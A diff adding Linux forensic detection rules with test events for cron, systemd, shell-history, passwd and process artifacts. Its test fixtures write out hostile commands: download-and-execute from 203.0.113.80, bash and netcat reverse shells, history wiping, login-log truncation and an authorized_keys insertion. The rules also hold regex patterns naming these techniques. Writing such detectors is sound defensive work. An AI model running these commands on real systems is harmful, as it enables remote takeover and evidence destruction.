@@ -1,0 +1,262 @@
+# Rules for artifacts that the forensic triage reads from a Linux system. Each event has
+# product linux, category forensics and a service that names the kind of artifact.
+# A hit says "look at this", not "this is an attack": an administrator can have a reason for each of them.
+title: Cron entry downloads a script and runs it
+name: forensics_cron_download_exec
+id: 6f3a2c10-0301-4a6e-9d7b-0a1b2c3d4e01
+description: A crontab has a job that gets a script from the network and gives it to a shell. This is a common way to stay on a system.
+level: high
+tags: [attack.persistence, attack.t1053.003]
+logsource: {product: linux, category: forensics, service: cron_file}
+detection:
+  download:
+    command|re|i: '(curl|wget)\b[^|;&]*\|\s*(sudo\s+)?(ba|da|z)?sh\b'
+  encoded:
+    command|contains|all: ['base64', '-d', '|']
+  condition: download or encoded
+tests:
+  - name: download piped into a shell
+    events:
+      - {product: linux, category: forensics, service: cron_file, action: cron_entry, user: root, command: "curl -fsSL http://203.0.113.80/u.sh | sh"}
+      - {product: linux, category: forensics, service: cron_file, action: cron_entry, user: root, command: "wget -qO- http://203.0.113.80/u.sh | sudo bash"}
+      - {product: linux, category: forensics, service: cron_file, action: cron_entry, user: root, command: "echo Y3VybA== | base64 -d | sh"}
+    expect: {alerts: 3}
+  - name: ordinary jobs
+    events:
+      - {product: linux, category: forensics, service: cron_file, action: cron_entry, user: root, command: "cd / && run-parts --report /etc/cron.hourly"}
+      - {product: linux, category: forensics, service: cron_file, action: cron_entry, user: backup, command: "/usr/local/bin/backup.sh && curl -fsS https://hc.example.test/ping > /dev/null"}
+      - {product: linux, category: forensics, service: cron_file, action: cron_entry, user: aiko, command: "/usr/local/bin/report.sh | mail -s report aiko"}
+    expect: {alerts: 0}
+  - name: the same command in a log line is for another rule
+    events: [{product: linux, service: cron, action: cron_run, user: root, command: "curl -fsSL http://203.0.113.80/u.sh | sh"}]
+    expect: {alerts: 0}
+---
+title: Cron entry runs a program from a temporary folder
+name: forensics_cron_temp_program
+id: 6f3a2c10-0302-4a6e-9d7b-0a1b2c3d4e02
+description: A crontab starts a program that lies in /tmp, /var/tmp or /dev/shm. Everyone can write there, and software that was installed does not live there.
+level: high
+tags: [attack.persistence, attack.t1053.003]
+logsource: {product: linux, category: forensics, service: cron_file}
+detection:
+  selection:
+    command|re: '^(\S+=\S+\s+)*((/usr)?/bin/(env\s+)?(ba|da|z)?sh\s+(-c\s+)?)?["'']?/(tmp|dev/shm|var/tmp)/\S'
+  condition: selection
+tests:
+  - name: programs in temporary folders
+    events:
+      - {product: linux, category: forensics, service: cron_file, command: "/dev/shm/.x/kworker"}
+      - {product: linux, category: forensics, service: cron_file, command: "/bin/sh /tmp/.update.sh"}
+      - {product: linux, category: forensics, service: cron_file, command: "PATH=/tmp /bin/bash -c '/var/tmp/a.out'"}
+    expect: {alerts: 3}
+  - name: jobs that only clean a temporary folder
+    events:
+      - {product: linux, category: forensics, service: cron_file, command: "find /tmp -type f -mtime +7 -delete"}
+      - {product: linux, category: forensics, service: cron_file, command: "/usr/local/bin/backup.sh --scratch /var/tmp/backup"}
+    expect: {alerts: 0}
+---
+title: Systemd unit starts something that does not belong in a service
+name: forensics_unit_suspicious_exec
+id: 6f3a2c10-0303-4a6e-9d7b-0a1b2c3d4e03
+description: A unit starts a program from a temporary folder, or downloads a script and runs it, or opens a shell to the network.
+level: high
+tags: [attack.persistence, attack.t1543.002]
+logsource: {product: linux, category: forensics, service: systemd_unit}
+detection:
+  temporary:
+    command|re: '^((/usr)?/bin/(env\s+)?(ba|da|z)?sh\s+(-c\s+)?)?["'']?/(tmp|dev/shm|var/tmp)/\S'
+  download:
+    command|re|i: '(curl|wget)\b[^|;&]*\|\s*(ba|da|z)?sh\b'
+  shell:
+    command|re: '-i\b[^|;]*>&?\s*/dev/tcp/'
+  condition: 1 of them
+tests:
+  - name: units that need a look
+    events:
+      - {product: linux, category: forensics, service: systemd_unit, unit: dbus-helper.service, command: "/var/tmp/.dbus/helper --daemon"}
+      - {product: linux, category: forensics, service: systemd_unit, unit: net.service, command: "/bin/bash -c 'curl -s http://203.0.113.80/a | bash'"}
+      - {product: linux, category: forensics, service: systemd_unit, unit: sh.service, command: "/bin/bash -c 'bash -i >& /dev/tcp/203.0.113.80/4444 0>&1'"}
+    expect: {alerts: 3}
+  - name: ordinary units
+    events:
+      - {product: linux, category: forensics, service: systemd_unit, unit: nginx.service, command: "/usr/sbin/nginx -g 'daemon on; master_process on;'"}
+      - {product: linux, category: forensics, service: systemd_unit, unit: app.service, command: "/usr/bin/env TMPDIR=/tmp /opt/app/bin/server --config /etc/app.toml"}
+    expect: {alerts: 0}
+---
+title: Shell history has a download that was run at once
+name: forensics_history_download_exec
+id: 6f3a2c10-0304-4a6e-9d7b-0a1b2c3d4e04
+description: Someone got a script from the network and gave it to a shell without looking at it.
+level: high
+tags: [attack.execution, attack.t1059.004]
+logsource: {product: linux, category: forensics, service: shell_history}
+detection:
+  download:
+    command|re|i: '(curl|wget)\b[^|;&]*\|\s*(sudo\s+)?(ba|da|z)?sh\b'
+  encoded:
+    command|re: 'base64\s+(-d|--decode)\b[^|;&]*\|\s*(sudo\s+)?(ba|da|z)?sh\b'
+  condition: download or encoded
+tests:
+  - name: downloads that were run
+    events:
+      - {product: linux, category: forensics, service: shell_history, user: root, command: "curl -s http://203.0.113.80/i.sh | bash"}
+      - {product: linux, category: forensics, service: shell_history, user: root, command: "echo aWQ= | base64 -d | sh"}
+    expect: {alerts: 2}
+  - name: ordinary downloads
+    events:
+      - {product: linux, category: forensics, service: shell_history, user: aiko, command: "curl -O https://example.test/app-1.2.tar.gz"}
+      - {product: linux, category: forensics, service: shell_history, user: aiko, command: "curl -s https://example.test/api | jq ."}
+      - {product: linux, category: forensics, service: shell_history, user: aiko, command: "base64 -d token.b64 > token.bin"}
+    expect: {alerts: 0}
+---
+title: Shell history was turned off or removed
+name: forensics_history_hidden
+id: 6f3a2c10-0305-4a6e-9d7b-0a1b2c3d4e05
+description: A command stops the shell from keeping history or deletes it, or the history file is a link to /dev/null. What was typed after that is not in the history.
+level: high
+tags: [attack.defense_evasion, attack.t1070.003]
+logsource: {product: linux, category: forensics, service: shell_history}
+detection:
+  command:
+    command|re: '(history\s+-c\b|unset\s+HISTFILE|HISTFILE=/dev/null|HISTSIZE=0|HISTFILESIZE=0|(rm|shred)\s+[^|;&]*_history\b|ln\s+-\w+\s+/dev/null\s+\S*_history\b)'
+  link:
+    action: history_link
+    target: /dev/null
+  condition: command or link
+tests:
+  - name: ways to leave no history
+    events:
+      - {product: linux, category: forensics, service: shell_history, user: root, command: "history -c"}
+      - {product: linux, category: forensics, service: shell_history, user: root, command: "unset HISTFILE"}
+      - {product: linux, category: forensics, service: shell_history, user: root, command: "rm -f ~/.bash_history"}
+      - {product: linux, category: forensics, service: shell_history, user: root, command: "ln -sf /dev/null ~/.bash_history"}
+      - {product: linux, category: forensics, service: shell_history, user: root, action: history_link, target: /dev/null}
+    expect: {alerts: 5}
+  - name: ordinary use of history
+    events:
+      - {product: linux, category: forensics, service: shell_history, user: aiko, command: "history | grep ssh"}
+      - {product: linux, category: forensics, service: shell_history, user: aiko, command: "echo $HISTFILE"}
+      - {product: linux, category: forensics, service: shell_history, user: aiko, command: "export HISTSIZE=10000"}
+      - {product: linux, category: forensics, service: shell_history, user: aiko, action: history_link, target: ../shared/history}
+    expect: {alerts: 0}
+---
+title: Shell history has a shell that was opened to the network
+name: forensics_history_reverse_shell
+id: 6f3a2c10-0306-4a6e-9d7b-0a1b2c3d4e06
+description: A command connects a shell to another computer, which gives that computer control of this one.
+level: critical
+tags: [attack.execution, attack.t1059.004, attack.command_and_control]
+logsource: {product: linux, category: forensics, service: shell_history}
+detection:
+  selection:
+    command|re: '(-i\b[^|;]*>&?\s*/dev/tcp/|\bn(c|cat)\b[^|;&]*\s-\w*e\b|mkfifo\s+\S+[^\n]*\bnc\b|pty\.spawn|\bsocat\b[^|;&]*\bexec:)'
+  condition: selection
+tests:
+  - name: shells to the network
+    events:
+      - {product: linux, category: forensics, service: shell_history, user: root, command: "bash -i >& /dev/tcp/203.0.113.80/4444 0>&1"}
+      - {product: linux, category: forensics, service: shell_history, user: root, command: "nc 203.0.113.80 4444 -e /bin/sh"}
+      - {product: linux, category: forensics, service: shell_history, user: root, command: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 203.0.113.80 4444 >/tmp/f"}
+    expect: {alerts: 3}
+  - name: ordinary network checks
+    events:
+      - {product: linux, category: forensics, service: shell_history, user: aiko, command: "nc -zv db.example.test 5432"}
+      - {product: linux, category: forensics, service: shell_history, user: aiko, command: "timeout 1 bash -c '</dev/tcp/db.example.test/5432' && echo open"}
+      - {product: linux, category: forensics, service: shell_history, user: aiko, command: "ssh -i ~/.ssh/id_ed25519 deploy@app.example.test"}
+    expect: {alerts: 0}
+---
+title: Shell history adds a key to authorized_keys
+name: forensics_history_key_added
+id: 6f3a2c10-0307-4a6e-9d7b-0a1b2c3d4e07
+description: A command writes into an authorized_keys file. The owner of that key can log in without a password. Administrators do this too, so compare the key with the list of known keys.
+level: medium
+tags: [attack.persistence, attack.t1098.004]
+logsource: {product: linux, category: forensics, service: shell_history}
+detection:
+  selection:
+    command|re: '>>?\s*\S*\.ssh/authorized_keys'
+  condition: selection
+tests:
+  - name: a key is added
+    events: [{product: linux, category: forensics, service: shell_history, user: root, command: "echo 'ssh-ed25519 AAAA fake' >> /root/.ssh/authorized_keys"}]
+    expect: {alerts: 1}
+  - name: the file is only read
+    events:
+      - {product: linux, category: forensics, service: shell_history, user: aiko, command: "cat ~/.ssh/authorized_keys"}
+      - {product: linux, category: forensics, service: shell_history, user: aiko, command: "ssh-keygen -lf ~/.ssh/authorized_keys > keys.txt"}
+    expect: {alerts: 0}
+---
+title: Shell history removes or empties a login log
+name: forensics_history_log_tamper
+id: 6f3a2c10-0308-4a6e-9d7b-0a1b2c3d4e08
+description: A command deletes or empties a log that records logins. Lines that are missing from that log can be missing because of this.
+level: high
+tags: [attack.defense_evasion, attack.t1070.002]
+logsource: {product: linux, category: forensics, service: shell_history}
+detection:
+  removed:
+    command|re: '(^|[\s;&|])(rm|shred|truncate)\s[^|;&]*/var/log/(auth\.log|secure|syslog|messages|wtmp|btmp|lastlog)(\s|;|&|$)'
+  emptied:
+    command|re: '(^|[^>])>\s*/var/log/(auth\.log|secure|syslog|messages|wtmp|btmp|lastlog)(\s|;|&|$)'
+  condition: removed or emptied
+tests:
+  - name: logs are removed or emptied
+    events:
+      - {product: linux, category: forensics, service: shell_history, user: root, command: "rm -f /var/log/auth.log"}
+      - {product: linux, category: forensics, service: shell_history, user: root, command: "cat /dev/null > /var/log/wtmp"}
+      - {product: linux, category: forensics, service: shell_history, user: root, command: "truncate -s 0 /var/log/btmp; exit"}
+    expect: {alerts: 3}
+  - name: logs are read or rotated files are removed
+    events:
+      - {product: linux, category: forensics, service: shell_history, user: aiko, command: "sudo tail -f /var/log/auth.log"}
+      - {product: linux, category: forensics, service: shell_history, user: aiko, command: "grep sshd /var/log/secure > /tmp/sshd.txt"}
+      - {product: linux, category: forensics, service: shell_history, user: aiko, command: "rm /var/log/nginx/access.log.5.gz"}
+      - {product: linux, category: forensics, service: shell_history, user: aiko, command: "rm /var/log/auth.log.4.gz"}
+      - {product: linux, category: forensics, service: shell_history, user: aiko, command: "echo marker >> /var/log/syslog"}
+    expect: {alerts: 0}
+---
+title: A second account has the user number of root
+name: forensics_extra_root_account
+id: 6f3a2c10-0309-4a6e-9d7b-0a1b2c3d4e09
+description: An account other than root has user number 0. It has all rights of root under another name.
+level: critical
+tags: [attack.persistence, attack.t1136.001]
+logsource: {product: linux, category: forensics, service: passwd}
+detection:
+  zero: {uid: 0}
+  root: {user: root}
+  condition: zero and not root
+tests:
+  - name: a second account with number 0
+    events:
+      - {product: linux, category: forensics, service: passwd, user: root, uid: 0}
+      - {product: linux, category: forensics, service: passwd, user: sysadm, uid: 0}
+      - {product: linux, category: forensics, service: passwd, user: aiko, uid: 1000}
+      - {product: linux, category: forensics, service: passwd, user: ten, uid: 10}
+    expect: {alerts: 1}
+---
+title: A process runs from a temporary folder or from a deleted file
+name: forensics_process_unusual_program
+id: 6f3a2c10-0310-4a6e-9d7b-0a1b2c3d4e10
+description: In the process list, a program runs from /tmp, /var/tmp or /dev/shm, or its file was deleted after it started.
+level: high
+tags: [attack.defense_evasion, attack.t1036]
+logsource: {product: linux, category: forensics, service: process_snapshot}
+detection:
+  temporary:
+    process|re: '^/(tmp|dev/shm|var/tmp)/'
+  deleted:
+    command|endswith: ' (deleted)'
+  condition: temporary or deleted
+tests:
+  - name: unusual programs
+    events:
+      - {product: linux, category: forensics, service: process_snapshot, user: root, process: /dev/shm/.x/kworker, command: "/dev/shm/.x/kworker -B"}
+      - {product: linux, category: forensics, service: process_snapshot, user: www-data, process: /usr/bin/perl, command: "/usr/bin/perl (deleted)"}
+    expect: {alerts: 2}
+  - name: ordinary programs
+    events:
+      - {product: linux, category: forensics, service: process_snapshot, user: root, process: /usr/sbin/sshd, command: "/usr/sbin/sshd -D"}
+      - {product: linux, category: forensics, service: process_snapshot, user: aiko, process: vim, command: "vim /tmp/notes.txt"}
+      - {product: linux, category: forensics, service: process_snapshot, user: root, process: "[kworker/0:1]", command: "[kworker/0:1]"}
+    expect: {alerts: 0}
